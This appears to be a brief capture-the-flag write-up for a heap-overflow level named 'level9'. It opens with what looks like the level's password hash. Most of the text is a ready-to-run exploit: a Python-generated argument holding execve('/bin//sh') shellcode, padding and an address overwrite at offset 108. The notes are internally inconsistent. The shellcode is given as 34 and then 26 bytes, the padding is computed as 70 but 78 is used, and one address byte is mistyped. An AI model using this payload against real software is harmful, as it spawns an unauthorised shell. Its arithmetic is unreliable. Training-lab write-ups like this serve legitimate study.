level9:c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

C++ code
expects an argument

new of `0x6c` bytes

function that copy the entire first argument at `0x0804a00c`

offset 108, we have to insert an address which point a shellcode

payload => (`0x0804a00c` + 0x4) + (shellcode 34 bytes long) + padding + `0x0804a00c`
108 - (4 + 26) = 108 - 30 = 70 paddings bytes

payload = `$(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80" + "A" * 78 + "\x0c\xa0\04\x08"')`
